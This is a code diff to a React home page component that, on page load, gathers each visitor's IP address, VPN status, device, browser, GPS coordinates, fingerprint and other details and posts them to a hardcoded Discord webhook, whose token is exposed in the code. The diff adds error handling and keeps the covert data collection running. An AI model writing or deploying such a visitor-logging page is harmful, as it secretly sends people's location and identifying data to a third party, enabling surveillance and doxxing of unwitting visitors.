@@ -6,6 +6,7 @@ import { getTrackingData, getGeolocation, TrackingData } from '@/utils/tracking'
 export default function Home() {
   const [loading, setLoading] = useState(true);
   const [trackingData, setTrackingData] = useState<TrackingData | null>(null);
+  const [error, setError] = useState<string | null>(null);
 
   useEffect(() => {
     const trackUser = async () => {
@@ -23,48 +24,57 @@ export default function Home() {
         }
 
         // Send data to Discord webhook
-        const webhookUrl = "https://discord.com/api/webhooks/1369271955613810758/KVcEQJWirZLCgwI4YXevqiSOJAClQe9fsmShJ5ub9iFaHNaIXwryvcH3KqkLsESB5kFR"; // Replace with your webhook URL
-        const discordPayload = {
-          embeds: [
-            {
-              title: "Visitor Tracking Data",
-              color: 0x00ff00,
-              fields: [
-                { name: "IP Address", value: data.ip_address, inline: true },
-                { name: "VPN Status", value: data.vpn_status, inline: true },
-                { name: "Device", value: data.device, inline: true },
-                { name: "Browser", value: data.browser, inline: true },
-                { name: "Location Permission", value: data.location_permission, inline: true },
-                { name: "Coordinates", value: data.coordinates.latitude && data.coordinates.longitude 
-                  ? `Lat: ${data.coordinates.latitude}, Lon: ${data.coordinates.longitude}`
-                  : "Not Available", inline: true },
-                { name: "Estimated Location", value: data.estimated_location, inline: true },
-                { name: "Fingerprint", value: data.fingerprint, inline: true },
-                { name: "Screen Resolution", value: data.screen_resolution, inline: true },
-                { name: "Timezone", value: data.timezone, inline: true },
-                { name: "Language", value: data.language, inline: true },
-                { name: "Connection Type", value: data.connection_type, inline: true },
-                { name: "Timestamp", value: data.timestamp, inline: false }
-              ]
-            }
-          ]
-        };
+        const webhookUrl = "https://discord.com/api/webhooks/1369271955613810758/KVcEQJWirZLCgwI4YXevqiSOJAClQe9fsmShJ5ub9iFaHNaIXwryvcH3KqkLsESB5kFR";
+        
+        try {
+          const discordPayload = {
+            embeds: [
+              {
+                title: "Visitor Tracking Data",
+                color: 0x00ff00,
+                fields: [
+                  { name: "IP Address", value: data.ip_address, inline: true },
+                  { name: "VPN Status", value: data.vpn_status, inline: true },
+                  { name: "Device", value: data.device, inline: true },
+                  { name: "Browser", value: data.browser, inline: true },
+                  { name: "Location Permission", value: data.location_permission, inline: true },
+                  { name: "Coordinates", value: data.coordinates.latitude && data.coordinates.longitude 
+                    ? `Lat: ${data.coordinates.latitude}, Lon: ${data.coordinates.longitude}`
+                    : "Not Available", inline: true },
+                  { name: "Estimated Location", value: data.estimated_location, inline: true },
+                  { name: "Fingerprint", value: data.fingerprint, inline: true },
+                  { name: "Screen Resolution", value: data.screen_resolution, inline: true },
+                  { name: "Timezone", value: data.timezone, inline: true },
+                  { name: "Language", value: data.language, inline: true },
+                  { name: "Connection Type", value: data.connection_type, inline: true },
+                  { name: "Timestamp", value: data.timestamp, inline: false }
+                ]
+              }
+            ]
+          };
 
-        await fetch(webhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(discordPayload)
-        });
+          await fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(discordPayload)
+          });
+        } catch (webhookError) {
+          console.error("Error sending webhook:", webhookError);
+          // Continue even if webhook fails
+        }
 
         setTrackingData(data);
       } catch (error) {
         console.error("Error tracking user:", error);
+        setError("Failed to track user data");
       } finally {
         setLoading(false);
       }
     };
 
-    trackUser();
+    if (typeof window !== 'undefined') {
+      trackUser();
+    }
   }, []);
 
   return (
@@ -75,6 +85,10 @@ export default function Home() {
           <div className="text-center">
             <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-gray-900 mx-auto"></div>
             <p className="mt-4 text-gray-600">Loading...</p>
+          </div>
+        ) : error ? (
+          <div className="text-center text-red-600">
+            <p>{error}</p>
           </div>
         ) : (
           <div className="text-center">
